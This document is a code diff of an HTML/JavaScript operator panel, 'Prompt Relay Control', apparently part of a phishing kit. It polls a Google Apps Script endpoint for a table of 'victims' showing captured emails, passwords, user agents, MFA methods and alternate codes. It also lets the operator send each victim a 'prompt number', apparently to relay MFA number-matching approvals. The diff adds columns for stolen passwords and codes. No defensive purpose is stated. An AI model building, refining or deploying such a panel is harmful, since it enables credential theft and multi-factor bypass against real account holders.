@@ -4,94 +4,15 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Prompt Relay Control</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      background: #0d1117;
-      color: #c9d1d9;
-      margin: 0;
-      padding: 20px;
-      line-height: 1.5;
-    }
-    .container { max-width: 1100px; margin: 0 auto; }
-    h1 { color: #58a6ff; margin-bottom: 0.4em; }
-    #status {
-      font-size: 1.1rem;
-      padding: 12px 16px;
-      border-radius: 6px;
-      background: #161b22;
-      border: 1px solid #30363d;
-      margin: 16px 0;
-    }
-    #status.fetching  { background: #21262d; }
-    #status.success   { border-color: #238636; color: #7ee787; }
-    #status.error     { border-color: #da3633; color: #f85149; }
-    #status.empty     { color: #8b949e; }
-
-    #raw-response {
-      margin-top: 24px;
-      padding: 16px;
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-      font-family: 'Consolas', monospace;
-      white-space: pre-wrap;
-      word-break: break-all;
-      max-height: 400px;
-      overflow-y: auto;
-      color: #a5d6ff;
-    }
-
-    #victims-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-    }
-    #victims-table th, #victims-table td {
-      padding: 12px 14px;
-      text-align: left;
-      border-bottom: 1px solid #30363d;
-    }
-    #victims-table th { background: #0d1117; color: #8b949e; }
-    #victims-table tr:hover { background: #1f2937; }
-
-    .code-input {
-      background: #0d1117;
-      color: #c9d1d9;
-      border: 1px solid #444c56;
-      border-radius: 4px;
-      padding: 6px 8px;
-      width: 110px;
-      margin-right: 8px;
-    }
-    .send-btn {
-      background: #238636;
-      color: white;
-      border: none;
-      padding: 6px 12px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 0.9rem;
-    }
-    .send-btn:hover { background: #2ea043; }
-    .send-btn:disabled { background: #444c56; cursor: not-allowed; }
-
-    #last-update { color: #8b949e; font-size: 0.9rem; }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
-<body>
+<body class="dark-theme">
   <div class="container">
     <h1>Prompt Relay Control</h1>
     <div id="status" class="fetching">Fetching victims...</div>
+    <div id="raw-response"><strong>Raw response from script:</strong><br>(nothing received yet)</div>
 
-    <div id="raw-response">
-      <strong>Raw response from script:</strong><br>(nothing received yet)
-    </div>
-
-    <table id="victims-table" style="display: none;">
+    <table id="victims-table" style="display:none;">
       <thead>
         <tr>
           <th>Timestamp</th>
@@ -99,91 +20,73 @@
           <th>Status</th>
           <th>User Agent</th>
           <th>Password</th>
-          <th>Send Code</th>
+          <th>Method</th>
+          <th>Alt Code</th>
+          <th>Send Number</th>
         </tr>
       </thead>
       <tbody id="victims-body"></tbody>
     </table>
 
-    <div style="margin-top: 2rem; color: #8b949e; font-size: 0.95rem;">
+    <div id="last-update-container" style="margin-top: 2rem; color: #8b949e; font-size: 0.95rem;">
       Last update: <span id="last-update">—</span> • Polling every 5 seconds
     </div>
   </div>
 
   <script>
+    // same control.js script as before (no change needed)
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMcaCzi5Cja5WzhFKhl6O2ypdS8BfWwkyoxIenPP22LjqlMpT0pMbEkUAkiK9ZzZFW/exec";
-
-    const statusEl     = document.getElementById('status');
-    const rawEl        = document.getElementById('raw-response');
-    const tableEl      = document.getElementById('victims-table');
-    const tbodyEl      = document.getElementById('victims-body');
+    const statusEl = document.getElementById('status');
+    const rawEl = document.getElementById('raw-response');
+    const tableEl = document.getElementById('victims-table');
+    const tbodyEl = document.getElementById('victims-body');
     const lastUpdateEl = document.getElementById('last-update');
 
-    // Preserve typed codes across refreshes
-    const typedCodes = new Map(); // email → typed value
+    const typedCodes = new Map();
 
     async function fetchVictims() {
       statusEl.textContent = "Fetching victims...";
       statusEl.className = "fetching";
 
       try {
-        const res = await fetch(`${SCRIPT_URL}?getVictims=true`, {
-          cache: 'no-cache',
-          headers: { 'Accept': 'application/json, text/plain, */*' }
-        });
-
+        const res = await fetch(`${SCRIPT_URL}?getVictims=true`, { cache: 'no-cache' });
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
-
         const text = await res.text();
-        rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty)')}`;
+        rawEl.innerHTML = `<strong>Raw response:</strong><br>${escapeHtml(text || '(empty)')}`;
 
-        if (!text.trim()) return showEmpty("Empty response");
-
-        const data = JSON.parse(text);
-        const victims = Array.isArray(data) ? data : (data.victims || []);
-
+        const victims = JSON.parse(text);
         if (victims.length > 0) {
-          const mapped = victims.map(v => ({
-            timestamp: v.timestamp || '—',
-            email:     v.email     || '—',
-            status:    'victim_ready',
-            userAgent: v.user_agent || v.userAgent || '—',
-            password:  '—'
-          }));
-          renderVictims(mapped);
+          renderVictims(victims);
         } else {
           showEmpty("No ready victims found");
         }
       } catch (err) {
         statusEl.textContent = `Error: ${err.message}`;
         statusEl.className = "error";
-        rawEl.innerHTML += `<br><span style="color:#f85149;">${escapeHtml(err.message)}</span>`;
       }
     }
 
     function renderVictims(items) {
-      // Save typed values before clearing
       document.querySelectorAll('.code-input').forEach(inp => {
         const val = inp.value.trim();
         if (val) typedCodes.set(inp.dataset.email, val);
       });
 
       tbodyEl.innerHTML = '';
-
       items.forEach(item => {
         const email = item.email;
         const saved = typedCodes.get(email) || '';
-
         const tr = document.createElement('tr');
         tr.innerHTML = `
-          <td>${escapeHtml(item.timestamp)}</td>
-          <td>${escapeHtml(item.email)}</td>
-          <td>${escapeHtml(item.status)}</td>
-          <td title="${escapeHtml(item.userAgent)}">${escapeHtml(item.userAgent.slice(0,70))}${item.userAgent.length > 70 ? '...' : ''}</td>
-          <td>${escapeHtml(item.password)}</td>
-          <td>
-            <input type="text" class="code-input" placeholder="Enter code" 
-                   data-email="${escapeHtml(email)}" value="${escapeHtml(saved)}">
+          <td data-label="Timestamp">${escapeHtml(item.timestamp)}</td>
+          <td data-label="Email">${escapeHtml(item.email)}</td>
+          <td data-label="Status">${escapeHtml(item.status || 'victim_ready')}</td>
+          <td data-label="User Agent" title="${escapeHtml(item.user_agent)}">${escapeHtml(item.user_agent?.slice(0,60) || '—')}${item.user_agent?.length > 60 ? '...' : ''}</td>
+          <td data-label="Password">${escapeHtml(item.password || '—')}</td>
+          <td data-label="Method">${escapeHtml(item.method || '—')}</td>
+          <td data-label="Alt Code">${escapeHtml(item.alt_code || '—')}</td>
+          <td data-label="Send Number">
+            <input type="text" class="code-input" placeholder="Enter number" data-email="${escapeHtml(email)}" value="${escapeHtml(saved)}">
             <button class="send-btn" data-email="${escapeHtml(email)}">Send</button>
           </td>
         `;
@@ -191,14 +94,9 @@
       });
 
       tableEl.style.display = 'table';
-      statusEl.textContent = `Victims connected: ${items.length}`;
+      statusEl.textContent = `Connected victims: ${items.length}`;
       statusEl.className = "success";
       lastUpdateEl.textContent = new Date().toLocaleTimeString();
-
-      // Cleanup old entries
-      for (let email of typedCodes.keys()) {
-        if (!items.some(i => i.email === email)) typedCodes.delete(email);
-      }
     }
 
     function showEmpty(msg) {
@@ -209,62 +107,42 @@
     }
 
     function escapeHtml(unsafe) {
-      return unsafe.replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' })[m]);
+      return unsafe.replace(/[&<>"']/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#039;' })[m]);
     }
 
-    // Send code using POST (matches doPost in GAS)
     document.addEventListener('click', async e => {
       if (!e.target.classList.contains('send-btn')) return;
-
       const btn = e.target;
       const email = btn.dataset.email;
       const input = document.querySelector(`.code-input[data-email="${escapeHtml(email)}"]`);
       const code = input?.value.trim();
-
-      if (!code) return alert("Enter a code first");
-
+      if (!code) return alert("Enter a number first");
       if (!confirm(`Send "${code}" to ${email}?`)) return;
 
       btn.disabled = true;
       btn.textContent = "Sending...";
 
       try {
-        const formData = new URLSearchParams();
-        formData.append('action', 'set_number');
-        formData.append('email', email);
-        formData.append('prompt_number', code);
-
-        const res = await fetch(SCRIPT_URL, {
-          method: 'POST',
-          body: formData,
-          cache: 'no-cache'
-        });
-
-        const responseText = await res.text();
-
-        if (res.ok && (responseText.includes('success":true') || responseText.includes('true'))) {
-          alert(`Code "${code}" sent`);
+        const formData = new URLSearchParams({ action: 'set_number', email, prompt_number: code });
+        const res = await fetch(SCRIPT_URL, { method: 'POST', body: formData, cache: 'no-cache' });
+        const txt = await res.text();
+        if (txt.includes('"success":true')) {
+          alert(`Sent "${code}"`);
           input.value = '';
           typedCodes.delete(email);
         } else {
-          alert(`Failed – server said: ${responseText || res.status}`);
-          console.log("Server response:", responseText);
+          alert(`Failed: ${txt || res.status}`);
         }
       } catch (err) {
-        alert("Send error: " + err.message);
-        console.error(err);
+        alert("Error: " + err.message);
       } finally {
         btn.disabled = false;
         btn.textContent = "Send";
       }
     });
 
-    // Start
     fetchVictims();
     setInterval(fetchVictims, 5000);
   </script>
 </body>
 </html>
-
-
-  
